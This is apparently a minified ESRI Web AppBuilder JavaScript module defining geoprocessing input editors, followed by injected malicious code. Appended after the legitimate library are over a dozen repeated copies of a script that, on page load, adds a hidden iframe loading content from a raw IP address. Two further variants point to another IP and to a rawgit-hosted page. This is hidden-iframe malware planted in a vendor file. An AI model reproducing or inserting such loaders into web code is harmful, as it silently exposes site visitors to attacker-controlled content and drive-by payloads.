// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/Deferred dojo/promise/all dojo/json dijit/form/NumberTextBox dijit/form/Select dijit/form/Textarea dijit/form/DateTextBox dijit/form/TimeTextBox jimu/dijit/CheckBox jimu/dijit/URLInput jimu/utils esri/tasks/LinearUnit esri/tasks/FeatureSet esri/geometry/Polygon esri/graphic ../BaseEditor".split(" "),function(e,h,g,c,l,q,r,m,k,n,t,u,v,w,x,p,y,z,A,B,f){var d={};d.UnsupportEditor=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-unsupport",
editorName:"UnsupportEditor",postCreate:function(){this.inherited(arguments);c.setAttr(this.domNode,"innerHTML",p.sanitizeHTML(this.message))},getValue:function(){return null}});d.ShowMessage=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-message",editorName:"ShowMessage",postCreate:function(){this.inherited(arguments);c.setAttr(this.domNode,"innerHTML",p.sanitizeHTML(this.message))},getValue:function(){return null}});d.GeneralEditorWrapperEditor=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-wrapper",
editorName:"GeneralEditorWrapperEditor",postCreate:function(){this.inherited(arguments);c.setStyle(this.gEditor.domNode,"width","100%");"Select"===this.editorName&&c.addClass(this.gEditor.domNode,"restrict-select-width");this.gEditor.placeAt(this.domNode)},getValue:function(){return this.gEditor.getValue()}});d.LongNumberEditor=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-long",editorName:"LongNumberEditor",postCreate:function(){this.inherited(arguments);this.value=isNaN(this.param.defaultValue)?
NaN:this.param.defaultValue;this.editor=new k({value:this.value,constraints:{places:0}});this.editor.placeAt(this.domNode)},getValue:function(){var a=this.editor.getValue();return isNaN(a)?null:a}});d.DoubleNumberEditor=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-double",editorName:"DoubleNumberEditor",postCreate:function(){this.inherited(arguments);this.value=isNaN(this.param.defaultValue)?NaN:this.param.defaultValue;this.editor=new k({value:this.value});this.editor.placeAt(this.domNode)},
getValue:function(){var a=this.editor.getValue();return isNaN(a)?null:a}});d.MultiValueChooser=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-multivalue-chooser",editorName:"MultiValueChooser",postCreate:function(){this.inherited(arguments);this.checkBoxs=[];g.forEach(this.param.choiceList,function(a){a=new w({label:a,checked:this.param.defaultValue&&-1<this.param.defaultValue.indexOf(a)?!0:!1});a.placeAt(this.domNode);this.checkBoxs.push(a)},this)},getValue:function(){var a=[];g.forEach(this.checkBoxs,
function(b){b.checked&&a.push(b.label)},this);return a}});d.MultiValueEditor=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-multivalue",editorName:"MultiValueEditor",postCreate:function(){this.inherited(arguments);this.editors=[];var a=c.create("div",{"class":"input-list"},this.domNode),b=h.clone(this.param,a);b.dataType=this.param.dataType.substr(13,this.param.dataType.length);b.originParam=this.param;setTimeout(h.hitch(this,this._initChildEditors,b,a),100);this._createAddInputNode(b,a)},_initChildEditors:function(a,
b){this.param.defaultValue&&0<this.param.defaultValue.length?g.forEach(this.param.defaultValue,function(c){a.defaultValue=c;this._createSingleInputContainerNode(a,b)},this):(delete a.defaultValue,this._createSingleInputContainerNode(a,b))},getValue:function(){var a=[];g.forEach(this.editors,function(b){a.push(b.getValue())},this);return a},getGPValue:function(){var a=new q,b=[];g.forEach(this.editors,function(a){b.push(a.getGPValue())},this);r(b).then(function(b){a.resolve(b)},function(b){a.reject(b)});
return a},destroy:function(){g.forEach(this.editors,function(a){a.destroy()});this.editors=[];this.inherited(arguments)},_createSingleInputContainerNode:function(a,b){b=c.create("div",{"class":"single-input"},b);a=this.editorManager.createEditor(a,"input",this.context,{widgetUID:this.widgetUID,config:this.config});var d=c.getContentBox(this.domNode).w-30-3;c.setStyle(a.domNode,{display:"inline-block",width:d+"px"});a.placeAt(b);this._createRemoveInputNode(b);b.inputEditor=a;this.editors.push(a);return b},
_createRemoveInputNode:function(a){var b=c.create("div",{"class":"remove",innerHTML:"-"},a);this.own(l(b,"click",h.hitch(this,function(){this.editors.splice(this.editors.indexOf(a.inputEditor),1);a.inputEditor.destroy();c.destroy(a)})));return b},_createAddInputNode:function(a,b){var d=c.create("div",{"class":"add-input"},this.domNode),e=c.create("div",{"class":"add-btn",innerHTML:"+"},d);this.own(l(e,"click",h.hitch(this,function(){this._createSingleInputContainerNode(a,b)})));return d}});d.LinerUnitEditor=
e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-liner-unit",editorName:"LinerUnitEditor",postCreate:function(){this.inherited(arguments);this.distance=this.param.defaultValue?this.param.defaultValue.distance:0;this.units=this.param.defaultValue?this.param.defaultValue.units:"esriMeters";this.inputDijit=new k({value:this.distance});this.selectDijit=new n({value:this.units,options:[{label:this.nls.meters,value:"esriMeters"},{label:this.nls.kilometers,value:"esriKilometers"},{label:this.nls.feet,
value:"esriFeet"},{label:this.nls.miles,value:"esriMiles"},{label:this.nls.nauticalMiles,value:"esriNauticalMiles"},{label:this.nls.yards,value:"esriYards"}]});c.addClass(this.selectDijit.domNode,"restrict-select-width");this.inputDijit.placeAt(this.domNode);this.selectDijit.placeAt(this.domNode)},getValue:function(){var a=new y;a.distance=this.inputDijit.getValue();a.units=this.selectDijit.getValue();return a}});d.DateTimeEditor=e(f,{baseClass:"jimu-gp-editor-base jimu-gp-editor-datatime",editorName:"DateTimeEditor",
postCreate:function(){var a=new Date(this.param.defaultValue);this.value=this.param.defaultValue?new Date(a.getFullYear(),a.getMonth(),a.getDate(),a.getHours(),a.getMinutes(),a.getSeconds()):null;this.inherited(arguments);this.dateDijit=new u({value:this.value,style:{width:"60%"}});this.timeDijit=new v({value:this.value,style:{width:"40%"},constraints:{timePattern:"HH:mm:ss",clickableIncrement:"T00:15:00",visibleIncrement:"T00:15:00"}});this.dateDijit.placeAt(this.domNode);this.timeDijit.placeAt(this.domNode)},
startup:function(){this.dateDijit.startup();this.timeDijit.startup()},getValue:function(){var a=new Date,b=this.dateDijit.getValue(),c=this.timeDijit.getValue();return null!==b&&null!==c?(a.setFullYear(b.getFullYear()),a.setMonth(b.getMonth()),a.setDate(b.getDate()),a.setHours(c.getHours()),a.setMinutes(c.getMinutes()),a.setSeconds(c.getSeconds()),a.getTime()):null}});d.GetUrlObjectFromLayer=e([f,n],{editorName:"GetUrlObjectFromLayer",postCreate:function(){this.options=[];g.forEach(this.map.graphicsLayerIds,
function(a){a=this.map.getLayer(a);"esri.layers.FeatureLayer"!==a.declaredClass||this.geometryType&&a.geometryType!==this.geometryType||this.options.push({label:a.label||a.title||a.name||a.id,value:a.id})},this);this.inherited(arguments);this.setValue(this.value);c.addClass(this.domNode,"jimu-gp-editor-sffl");c.addClass(this.domNode,"jimu-gp-editor-base")},getValue:function(){return this.value},getGPValue:function(){var a,b;g.forEach(this.map.graphicsLayerIds,function(b){var c=this.map.getLayer(b);
b===this.getValue()&&(a=c.url)},this);b={url:a};b=this.wrapGPValue(b);return this.wrapValueToDeferred(b)}});d.ObjectUrlEditor=e([f,x],{editorName:"ObjectUrlEditor",postCreate:function(){this.rest=!1;this.inherited(arguments);c.addClass(this.domNode,"jimu-gp-editor-ourl");c.addClass(this.domNode,"jimu-gp-editor-base")},getValue:function(){return this.value},getGPValue:function(){var a;a=this.getValue()?{url:this.getValue()}:null;a=this.wrapGPValue(a);return this.wrapValueToDeferred(a)}});d.SimpleJsonEditor=
e([f,t],{editorName:"SimpleJsonEditor",postMixInProperties:function(){this.inherited(arguments);"object"===typeof this.value&&(this.value=m.stringify(this.value))},postCreate:function(){this.inherited(arguments);c.addClass(this.domNode,"jimu-gp-editor-json");c.addClass(this.domNode,"jimu-gp-editor-base")},getValue:function(){return this.value},getGPValue:function(){var a;a=this.getValue()?m.parse(this.getValue()):null;a=this.wrapGPValue(a);return this.wrapValueToDeferred(a)}});d.currentExtentEditor=
e(f,{editorName:"SelectFeatureSetFromMap",postCreate:function(){this.inherited(arguments);c.setAttr(this.domNode,"innerHTML",this.message)},getValue:function(){var a=new z,b=[new B(A.fromExtent(this.map.extent))];a.features=b;return a}});return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});